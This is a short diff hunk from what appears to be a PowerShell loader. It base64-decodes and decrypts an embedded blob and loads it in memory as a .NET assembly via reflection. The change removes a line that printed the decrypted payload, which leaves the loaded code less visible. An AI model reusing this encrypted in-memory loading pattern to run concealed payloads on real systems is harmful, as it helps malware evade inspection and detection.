@@ -61,7 +61,6 @@ if(-not ([System.Management.Automation.PSTypeName]"$method").Type) {
     $DLL = [System.Convert]::FromBase64String($DLL)
     $DLL = Decrypt-Code $DLL $KEY
     $DLL = [System.Text.Encoding]::ASCII.GetString($DLL)
-    write-host $DLL
     [Reflection.Assembly]::Load([Convert]::FromBase64String($DLL)) | Out-Null
 }
 
